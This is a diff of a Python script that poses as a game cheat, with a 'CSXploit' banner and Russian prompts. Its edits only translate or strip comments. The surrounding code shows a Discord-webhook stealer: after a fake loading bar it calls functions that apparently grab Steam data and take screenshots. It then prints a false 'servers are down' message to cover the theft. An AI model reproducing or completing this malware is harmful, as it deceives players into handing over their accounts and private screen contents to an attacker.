@@ -6,7 +6,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 from PIL import ImageGrab
 from zipfile import ZipFile
 
-# Webhook URL
+# ссылка вашего вебхука
 hook = "YOUR DISCORD WEBHOOK"
 user = os.path.expanduser("~")
 
@@ -91,10 +91,10 @@ def loading_bar():
     toolbar_width = 40
     sys.stdout.write("Загрузка: [%s]" % (" " * toolbar_width))
     sys.stdout.flush()
-    sys.stdout.write("\b" * (toolbar_width+1)) # return to start of line, after '['
+    sys.stdout.write("\b" * (toolbar_width+1)) 
 
     for i in range(toolbar_width):
-        time.sleep(0.1)  # simulation of some work
+        time.sleep(0.1) 
         sys.stdout.write("-")
         sys.stdout.flush()
 
@@ -102,7 +102,7 @@ def loading_bar():
 
 def main():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print("\033[94m")  # Set the text to blue
+    print("\033[94m")  
     print(r"""
  _________   _____________  ___      .__         .__  __   
 \_   ___ \ /   _____/\   \/  /_____ |  |   ____ |__|/  |_ 
@@ -111,14 +111,14 @@ def main():
  \______  /_______  //___/\  \   __/|____/\____/|__||__|  
         \/        \/       \_/__|                         
     """)
-    print("\033[0m")  # Reset the text color
+    print("\033[0m")  
 
     consent = input("Вы хотите запустить чит? (y/n): ").strip().lower()
     if consent == 'y':
         os.system('cls' if os.name == 'nt' else 'clear')
-        print("\033[94m")  # Set the text to blue
+        print("\033[94m")  
         loading_bar()
-        print("\033[0m")  # Reset the text color
+        print("\033[0m")  
         steam_st()
         screen()
         print("\033[91mСервера на данный момент в аварийном состоянии, попробуйте позже\033[0m")
